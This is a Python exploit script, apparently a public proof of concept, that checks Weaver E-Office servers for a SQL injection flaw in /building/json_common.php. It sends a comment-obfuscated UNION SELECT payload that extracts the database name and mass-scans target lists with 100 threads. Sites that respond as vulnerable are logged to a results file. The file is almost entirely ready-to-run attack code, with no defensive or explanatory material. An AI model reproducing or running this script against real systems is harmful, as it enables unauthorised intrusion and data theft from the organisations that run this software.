import argparse,sys,requests
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    banner = """
 ██▓    ▄▄▄       ███▄ ▄███▓    ██ ▄█▀ ██▓ ███▄    █   ▄████ 
▓██▒   ▒████▄    ▓██▒▀█▀ ██▒    ██▄█▒ ▓██▒ ██ ▀█   █  ██▒ ▀█▒
▒██▒   ▒██  ▀█▄  ▓██    ▓██░   ▓███▄░ ▒██▒▓██  ▀█ ██▒▒██░▄▄▄░
░██░   ░██▄▄▄▄██ ▒██    ▒██    ▓██ █▄ ░██░▓██▒  ▐▌██▒░▓█  ██▓
░██░    ▓█   ▓██▒▒██▒   ░██▒   ▒██▒ █▄░██░▒██░   ▓██░░▒▓███▀▒
░▓      ▒▒   ▓▒█░░ ▒░   ░  ░   ▒ ▒▒ ▓▒░▓  ░ ▒░   ▒ ▒  ░▒   ▒ 
 ▒ ░     ▒   ▒▒ ░░  ░      ░   ░ ░▒ ▒░ ▒ ░░ ░░   ░ ▒░  ░   ░ 
 ▒ ░     ░   ▒   ░      ░      ░ ░░ ░  ▒ ░   ░   ░ ░ ░ ░   ░ 
 ░           ░  ░       ░      ░  ░    ░           ░       ░ 
                                          version:1.0
                                          author:YeahSir                   
"""
    print(banner)

def main():
    banner()
    parser = argparse.ArgumentParser(description=' 泛微E-Office json_common.php SQL注入漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='intput link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Useag:\n\t python {sys.argv[0]} -h")

def poc(target):
    payload_url = '/building/json_common.php'
    url = target+payload_url
    header = {
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0",
        "Content-Length":"83",
        "Connection":"close",
        "Content-Type":"application/x-www-form-urlencoded",
        "Upgrade-Insecure-Requests":"1",
        "Accept-Encoding":"gzip, deflate",
    }

    data = "tfs=city` where cityId =-1 /*!50000union*/ /*!50000select*/1,2,database() ,4#|2|333"
    # proxies = {
    #     '',''
    # }
    res1 = requests.get(url=target)
    if res1.status_code == 200:
        try:
            res2 =requests.post(url=url,headers=header,data=data,verify=False)
            if res2.status_code == 200 and 'eoffice' in res2.text :
                print(f'[+] 该url{target}存在漏洞')
                with open('result.txt','a',encoding='utf-8') as f:
                    f.write(target+'\n')
            else:
                print(f'[-]该站点{target}不存在漏洞')
        except Exception as e:
            print(f'[0]该站点{target}存在访问问题，请手动测试')




if __name__ ==  '__main__':
    main()